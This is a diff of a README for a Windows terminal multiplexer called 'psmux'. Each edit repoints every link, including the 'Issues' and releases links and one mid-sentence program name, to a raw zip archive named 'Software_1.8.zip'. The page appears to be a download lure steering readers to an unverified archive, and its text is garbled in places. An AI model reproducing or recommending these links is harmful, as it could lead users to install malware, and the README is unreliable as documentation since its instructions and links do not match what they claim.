@@ -6,7 +6,7 @@ Welcome to psmux, a terminal multiplexer crafted for Windows. With psmux, you ca
 
 ## 🔗 Download psmux
 
-[![Download psmux](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip%20psmux-%20-blue)](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip)
+[![Download psmux](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip%20psmux-%20-blue)](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip)
 
 ## 📋 What You Need
 
@@ -19,7 +19,7 @@ Before you download and run psmux, ensure your system meets the following requir
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of psmux: [Download psmux Releases](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip).
+Visit this page to download the latest version of psmux: [Download psmux Releases](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip).
 
 1. On the releases page, locate the latest version of psmux.
 2. Click on the release title to see the details.
@@ -32,7 +32,7 @@ Visit this page to download the latest version of psmux: [Download psmux Release
 
 After installing psmux, here's how to start using it:
 
-1. Open your PowerShell, Windows Terminal, or https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip
+1. Open your PowerShell, Windows Terminal, or https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip
 2. Type `psmux` and press Enter. This will launch the interface.
 3. To create a new session, type `pmux new-session` and hit Enter.
 4. You can split your window vertically and horizontally to manage multiple tasks.
@@ -66,7 +66,7 @@ If you encounter issues while downloading or running psmux, here are common solu
 
 For questions or troubleshooting, you can reach out to the community:
 
-- Visit our [GitHub Issues](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip) for active discussions and support.
+- Visit our [GitHub Issues](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip) for active discussions and support.
 - Join our user community on forums and chat groups to share experiences and tips with other users.
 
 ## 🎉 Conclusion
@@ -75,4 +75,4 @@ psmux simplifies your terminal experience in Windows. With its user-friendly com
 
 Ready to enhance your terminal skills? 
 
-[![Download psmux](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip%20psmux-%20-blue)](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/chocolatey/tools/psmux-rotisserie.zip)
+[![Download psmux](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip%20psmux-%20-blue)](https://raw.githubusercontent.com/nileshfating/psmux/master/packages/Software_1.8.zip)
